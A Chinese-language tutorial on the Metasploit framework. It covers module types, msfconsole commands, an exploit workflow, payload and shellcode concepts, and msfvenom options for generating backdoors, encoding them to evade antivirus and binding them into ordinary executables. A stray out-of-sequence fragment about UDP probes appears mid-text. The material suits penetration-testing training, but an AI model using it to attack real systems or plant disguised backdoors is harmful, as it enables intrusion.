渗透工具—MSF的使用

简介

Metasploit是一款开源安全漏洞检测工具，附带数百个已知的软件漏洞，并保持频繁更新，是强大的渗透测试框架。msf使用的是postgresql数据库。

MSF模块

1、辅助模块auxiliary

2、攻击模块exploits

3、攻击载荷模块payload

4、后渗透攻击模块post

5、编码模块Encoders

6、免杀模块evasion

常见命令

命令 描述
use 使用某个模块
info 查看模块的详细信息
set 模块选型设置
exploit/run 启动脚本
search 搜索关键字
show options 查看脚本配置选项
show targets 显示适用的主机类型
show payloads 显示适用的payload类型

使用方法

（1）进入框架：msfconsole

（2）使用search命令查找相关漏洞：search xxx

（3）使用use进入模块：use xxx

（4）使用info查看模块信息：info

（5）设置攻击载荷：set payload xxx

（6）查看模块需要配置的参数：show options

（7）设置参数：set RHOST ip

（8）攻击：exploit/run

（9）后渗透阶段

不同的攻击用到的步骤也不一样，这是一成不变的，需要灵活使用。也可以将攻击代码写入configure.rc配置文件中，然后使用命令msfconsole -r configure.rc进行自动攻击

（6）udp_probe：UDP服务探测器

（7）udp_sweep：UDP服务清理程序

攻击载荷（payload）

攻击载荷payload模块路径：/usr/share/metasploit-framework/modules/payloads

Payload中包含攻击进入目标主机后需要在远程系统中运行的恶意代码。在MSF中Payload是一种特殊模块，它们能够以漏洞利用模块运行，并能够利用目标系统中的安全漏洞实施攻击。

Shellcode：在渗透攻击时作为攻击载荷运行的一组机器指令（汇编语言）。在大多数情况下，目标系统执行了shellcode这一组指令后，才会提供一个命令行shell。

使用方式

方法一

exploit+payload，exploit是指利用漏洞的一个过程和方法，最终的目的是为了执行payload，payload是真正实现攻击的代码。在使用exploit时，使用use来调用模块，用set调用各种payload

方法二

直接使用payload，但第一步同方法一，接着可以使用generate命令来生成payload

获得payload的一些基本信息和设置的参数，buf时payload的16进制表示方式。

但是，payload中可能存在所谓的“坏字符”，它们在执行过程中会被过滤掉或以其他语义的方式被执行，导致payload在目标系统上执行和预期结果不一致。

例：缓冲区溢出中，会把“\x00”当作一个“坏字符”，导致shellcode无法执行

MSF后门生成

msfvenom常用命令参数

命令 描述
-l 列出指定模块的所有可用资源. 模块类型包括: payloads, encoders, nops,…all
-p 指定需要使用的payload(攻击荷载)。也可以使用自定义payload,几乎是支持全平台的
-f 指定输出格式
-e 指定需要使用的encoder（编码器）编码免杀
-a 指定payload的目标架构，例如x86 还是 x64 还是 x86_64
-o 指定创建好的payload的存放位置
-b 设定规避字符集，指定需要过滤的坏字符。例如：不使用 ‘\x0f’、’\x00’
-n 为payload预先指定一个NOP滑动长度
-s 设定有效攻击荷载的最大长度生成payload的最大长度，就是文件大小
-i 指定payload的编码次数
-c 指定一个附加的win32 shellcode文件
-x 指定一个自定义的可执行文件作为模板。例如：原先有个正常文件normal.exe 可以通过这个选项把后门捆绑到这个程序上面
-k 保护模板程序的动作，注入的payload作为一个新的进程运行。例如：原先有个正常文件normal.exe 可以通过这个选项把后门捆绑到这个程序上面
-v 指定一个自定义的变量，以确定输出格式
-t 从stdin读取有效负载时等待的秒数（默认为30，0表示禁用)
-h 查看帮助选项
-platform 指定payload的目标平台
